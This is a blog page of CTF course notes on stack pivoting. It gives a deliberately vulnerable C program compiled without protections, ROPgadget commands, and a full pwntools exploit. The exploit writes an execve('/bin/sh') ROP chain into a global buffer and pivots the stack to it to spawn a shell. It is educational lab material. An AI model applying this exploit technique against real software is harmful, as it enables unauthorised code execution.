<!doctype html><html lang=en-us dir=ltr><head><meta charset=UTF-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content='
  Simple PWN - 0x09(stack pivoting)
  #


  tags: CTF PWN eductf
  #


  Stack Pivoting background
  #

NTUSTISC - Pwn Basic 3 [2019.03.26]
Pwn week1
It was used when stack overflow bytes not big enough to access a shellcode but it has another lots of writable space can be accessed.
More detailed info. can refer to Binary Exploitation (Pwn)

  Original Code
  #

#include <stdio.h>
#include <unistd.h>

char name[0x80]

int main()
{
    setvbuf(stdin, 0, _IONBF, 0);
    setvbuf(stdout, 0, _IONBF, 0);

    char s[0x10];

    printf("Give me your name: ");
    read(0, name, 0x80);

    printf("Give me your ROP: ");
    read(0, s, 0x20);

    return 0;
}

You can observe that it has not much stack buffer overflow can use, but it has global variable name with space 0x80(can be another stack)
gcc -o stack_pivoting stack_pivoting.c -no-pie -fno-stack-protector -z norelro -zexecstack -static

Note that:
must use mprotect to change permission of global variable name just like lecture 0x04, add these line in original code
#include <sys/mman.h>
mprotect(0x403000, 0x1000, PROT_READ|PROT_WRITE|PROT_EXEC);
Before mprotect - vmmap


After mprotect - vmmap



  Exploit
  #



Construct ROP chain'><meta name=theme-color media="(prefers-color-scheme: light)" content="#ffffff"><meta name=theme-color media="(prefers-color-scheme: dark)" content="#343a40"><meta name=color-scheme content="light dark"><meta property="og:url" content="https://bernie6401.github.io/security/course/ntu-cs/pwn/simple-pwn---0x09stack-pivoting/"><meta property="og:site_name" content="SBK Hugo Site"><meta property="og:title" content="Simple PWN - 0x09(stack pivoting)"><meta property="og:description" content='Simple PWN - 0x09(stack pivoting) # tags: CTF PWN eductf # Stack Pivoting background # NTUSTISC - Pwn Basic 3 [2019.03.26] Pwn week1 It was used when stack overflow bytes not big enough to access a shellcode but it has another lots of writable space can be accessed. More detailed info. can refer to Binary Exploitation (Pwn)
Original Code # #include <stdio.h> #include <unistd.h> char name[0x80] int main() { setvbuf(stdin, 0, _IONBF, 0); setvbuf(stdout, 0, _IONBF, 0); char s[0x10]; printf("Give me your name: "); read(0, name, 0x80); printf("Give me your ROP: "); read(0, s, 0x20); return 0; } You can observe that it has not much stack buffer overflow can use, but it has global variable name with space 0x80(can be another stack) gcc -o stack_pivoting stack_pivoting.c -no-pie -fno-stack-protector -z norelro -zexecstack -static Note that: must use mprotect to change permission of global variable name just like lecture 0x04, add these line in original code #include <sys/mman.h> mprotect(0x403000, 0x1000, PROT_READ|PROT_WRITE|PROT_EXEC); Before mprotect - vmmap After mprotect - vmmap Exploit # Construct ROP chain'><meta property="og:locale" content="en_us"><meta property="og:type" content="article"><meta property="article:section" content="security"><meta property="article:tag" content="CTF"><meta property="article:tag" content="PWN"><meta property="article:tag" content="Eductf"><title>Simple PWN - 0x09(stack pivoting) | SBK Hugo Site</title>
<link rel=icon href=/favicon.png><link rel=manifest href=/manifest.json><link rel=canonical href=https://bernie6401.github.io/security/course/ntu-cs/pwn/simple-pwn---0x09stack-pivoting/><link rel=stylesheet href=/book.min.6c8b9d2a1fc95075ed7da46ca81060b39add8fff6741ac51259f768929281e2c.css integrity="sha256-bIudKh/JUHXtfaRsqBBgs5rdj/9nQaxRJZ92iSkoHiw=" crossorigin=anonymous><script defer src=/fuse.min.js></script><script defer src=/en.search.min.acdc41c8d39e6c69d70d8a23779875e0a3733fefead3e428d5344966bb12f562.js integrity="sha256-rNxByNOebGnXDYojd5h14KNzP+/q0+Qo1TRJZrsS9WI=" crossorigin=anonymous></script></head><body dir=ltr><input type=checkbox class="hidden toggle" id=menu-control>
<input type=checkbox class="hidden toggle" id=toc-control><main class="container flex"><aside class=book-menu><div class=book-menu-content><nav><h2 class=book-brand><a class="flex align-center" href=/><span>SBK Hugo Site</span></a></h2><div class="book-search hidden"><input type=text id=book-search-input placeholder=Search aria-label=Search maxlength=64 data-hotkeys=s/><div class="book-search-spinner hidden"></div><ul id=book-search-results></ul></div><script>document.querySelector(".book-search").classList.remove("hidden")</script></nav><script>(function(){var e=document.querySelector("aside .book-menu-content");addEventListener("beforeunload",function(){localStorage.setItem("menu.scrollTop",e.scrollTop)}),e.scrollTop=localStorage.getItem("menu.scrollTop")})()</script></div></aside><div class=book-page><header class=book-header><div class="flex align-center justify-between"><label for=menu-control><img src=/svg/menu.svg class=book-icon alt=Menu></label><h3>Simple PWN - 0x09(stack pivoting)</h3><label for=toc-control><img src=/svg/toc.svg class=book-icon alt="Table of Contents"></label></div><aside class="hidden clearfix"><nav id=TableOfContents><ul><li><ul><li></li></ul></li><li><a href=#stack-pivoting-background>Stack Pivoting background</a></li><li><a href=#original-code>Original Code</a></li><li><a href=#exploit>Exploit</a></li><li><a href=#reference>Reference</a></li></ul></nav></aside></header><article class="markdown book-article"><h1 id=simple-pwn---0x09stack-pivoting>Simple PWN - 0x09(stack pivoting)
<a class=anchor href=#simple-pwn---0x09stack-pivoting>#</a></h1><h6 id=tags-ctf-pwn-eductf>tags: <code>CTF</code> <code>PWN</code> <code>eductf</code>
<a class=anchor href=#tags-ctf-pwn-eductf>#</a></h6><h2 id=stack-pivoting-background>Stack Pivoting background
<a class=anchor href=#stack-pivoting-background>#</a></h2><p><a href="https://youtu.be/iA4Hrr17ooI?t=6865">NTUSTISC - Pwn Basic 3 [2019.03.26]</a>
<a href="https://youtu.be/ktoVQB99Gj4?t=7898">Pwn week1</a>
It was used when stack overflow bytes not big enough to access a shellcode but it has another lots of writable space can be accessed.
More detailed info. can refer to <a href="https://youtu.be/5D7tvxpSUUM?t=9543">Binary Exploitation (Pwn)</a></p><h2 id=original-code>Original Code
<a class=anchor href=#original-code>#</a></h2><pre tabindex=0><code class=language-cpp! data-lang=cpp!>#include &lt;stdio.h&gt;
#include &lt;unistd.h&gt;

char name[0x80]

int main()
{
    setvbuf(stdin, 0, _IONBF, 0);
    setvbuf(stdout, 0, _IONBF, 0);

    char s[0x10];

    printf(&#34;Give me your name: &#34;);
    read(0, name, 0x80);

    printf(&#34;Give me your ROP: &#34;);
    read(0, s, 0x20);

    return 0;
}
</code></pre><ul><li>You can observe that it has not much stack buffer overflow can use, but it has global variable <code>name</code> with space <code>0x80</code>(can be another stack)<pre tabindex=0><code class=language-bash! data-lang=bash!>gcc -o stack_pivoting stack_pivoting.c -no-pie -fno-stack-protector -z norelro -zexecstack -static
</code></pre></li><li><font color=FF0000>Note that</font>:
must use <code>mprotect</code> to change permission of global variable <code>name</code> just like <a href=https://hackmd.io/@UHzVfhAITliOM3mFSo6mfA/HJhgXGKci>lecture 0x04</a>, add these line in original code<pre tabindex=0><code class=language-c! data-lang=c!>#include &lt;sys/mman.h&gt;
mprotect(0x403000, 0x1000, PROT_READ|PROT_WRITE|PROT_EXEC);
</code></pre><strong>Before <code>mprotect</code> - <code>vmmap</code></strong>
<img src=https://imgur.com/z8cK5SM.png alt>
<img src=https://imgur.com/J6qKJ8N.png alt>
<strong>After <code>mprotect</code> - <code>vmmap</code></strong>
<img src=https://imgur.com/gNr8Fya.png alt></li></ul><h2 id=exploit>Exploit
<a class=anchor href=#exploit>#</a></h2><ol><li><p>Construct <code>ROP</code> chain</p><pre tabindex=0><code class=language-bash! data-lang=bash!>objdump -d -M Intel stack_pivoting | grep &#34;&lt;name&gt;&#34;
ROPgadget --binary stack_pivoting --only &#34;pop|ret|syscall|leave&#34; &gt; one_gadget
vim one_gadget
</code></pre><p><img src=https://imgur.com/TYmCYw4.png alt>
<img src=https://imgur.com/o5L0Uvu.png alt>
<img src=https://imgur.com/OU9yJU4.png alt>
<img src=https://imgur.com/tWcfPEN.png alt>
<img src=https://imgur.com/ix4Phxm.png alt>
<img src=https://imgur.com/aZN3iu8.png alt></p></li><li><p>Find address of variable <code>name</code></p><pre tabindex=0><code class=language-bash! data-lang=bash!>objdump -d -M Intel stack_pivoting | grep &#34;&lt;name&gt;&#34;
</code></pre><p><img src=https://imgur.com/l6OIT2S.png alt></p></li><li><p>Whole exploit
:::spoiler Code</p><pre tabindex=0><code class="language-python!=" data-lang="python!=">from pwn import *

context.arch = &#39;amd64&#39;

r = process(&#39;./stack_pivoting&#39;)
raw_input()
name = 0x4c70c0
leave_ret = 0x40182d
pop_rdi_ret = 0x401ecf
pop_rsi_ret = 0x409efe
pop_rax_ret = 0x44fd07
pop_rdx_rbx_ret = 0x485b2b
syscall = 0x401c84

ROP = b&#39;/bin/sh\x00&#39;
ROP += flat(
    pop_rdi_ret, name,
    pop_rsi_ret, 0,
    pop_rdx_rbx_ret, 0, 0,
    pop_rax_ret, 0x3b,
    syscall
)

r.sendafter(&#34;Give me your name: &#34;, ROP)
raw_input()
r.sendafter(&#34;Give me your ROP: &#34;, b&#39;a&#39;*0x10 + p64(name) + p64(leave_ret))

r.interactive()
</code></pre><p>:::</p><ul><li>First, write <code>ROP</code> chain to global variable <code>name</code></li><li>Next, use 2 <code>leave ; ret</code> to pivot <code>name</code> as a stack</li></ul></li><li><p>Finally, you got shell!!!
<img src=https://imgur.com/kCyVi4N.png alt></p></li></ol><h2 id=reference>Reference
<a class=anchor href=#reference>#</a></h2><p><a href=https://man7.org/linux/man-pages/man2/mprotect.2.html>mprotect.2 man</a>
<a href=https://ithelp.ithome.com.tw/articles/10187093>trace 30個基本Linux系統呼叫第二十二日：mprotect</a></p></article><footer class=book-footer><div class="flex flex-wrap justify-between"></div><script>(function(){function e(e){const t=window.getSelection(),n=document.createRange();n.selectNodeContents(e),t.removeAllRanges(),t.addRange(n)}document.querySelectorAll("pre code").forEach(t=>{t.addEventListener("click",function(){if(window.getSelection().toString())return;e(t.parentElement),navigator.clipboard&&navigator.clipboard.writeText(t.parentElement.textContent)})})})()</script></footer><div class=book-comments></div><label for=menu-control class="hidden book-menu-overlay"></label></div><aside class=book-toc><div class=book-toc-content><nav id=TableOfContents><ul><li><ul><li></li></ul></li><li><a href=#stack-pivoting-background>Stack Pivoting background</a></li><li><a href=#original-code>Original Code</a></li><li><a href=#exploit>Exploit</a></li><li><a href=#reference>Reference</a></li></ul></nav></div></aside></main></body></html>